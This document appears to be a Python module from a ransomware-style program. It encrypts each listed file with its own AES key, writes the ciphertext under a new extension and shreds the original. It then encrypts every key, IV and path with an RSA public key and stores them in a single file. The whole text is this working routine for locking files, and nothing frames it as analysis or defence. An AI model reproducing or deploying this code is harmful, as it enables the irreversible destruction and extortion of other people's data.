from .symmetric_encryption import AES
from .asymmetric_encryption import RSA
from os import urandom
from .config import AES_SECRET_KEY_SIZE_IN_BYTES, AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES, ENCRYPTED_FILE_EXTENSION, LOCAL_PUBLIC_KEY, ENCRYPTED_AES_KEY_FILE_LOCATION
from .utils import read_data_from_file, write_data_to_file, shred_file
from base64 import b64encode


def encrypt_files(file_paths):
    for file_path in file_paths:
        aes_secret_key = urandom(AES_SECRET_KEY_SIZE_IN_BYTES)
        aes_initialization_vector = urandom(AES_INITIALIZATION_VECTOR_SIZE_IN_BYTES)

        symmetric_cipher = AES(aes_secret_key, aes_initialization_vector)
        unencrypted_data = read_data_from_file(file_path)
        encrypted_data = symmetric_cipher.encrypt_data(unencrypted_data)

        new_file_path = f"{file_path}{ENCRYPTED_FILE_EXTENSION}"
        write_data_to_file(new_file_path, encrypted_data)

        shred_file(file_path)

        yield b64encode(aes_secret_key).decode("utf-8"), b64encode(aes_initialization_vector).decode("utf-8"), b64encode(new_file_path.encode("utf-8")).decode("utf-8")


def encrypt_file_details(encoded_aes_secret_key, encoded_initialization_vector, encoded_file_path):
    cipher = RSA(public_key=LOCAL_PUBLIC_KEY[0])
    details = f"{encoded_aes_secret_key}\t{encoded_initialization_vector}\t{encoded_file_path}".encode("utf-8")
    encrypted_data = cipher.encrypt_data(details)
    return encrypted_data


def start_encryption(file_paths):
    list_of_file_details = [detail for detail in encrypt_files(file_paths)]
    encrypted_file_details = [encrypt_file_details(file_detail[0], file_detail[1], file_detail[2]) for file_detail in list_of_file_details]
    write_data_to_file(ENCRYPTED_AES_KEY_FILE_LOCATION, encrypted_file_details, serialized=False)

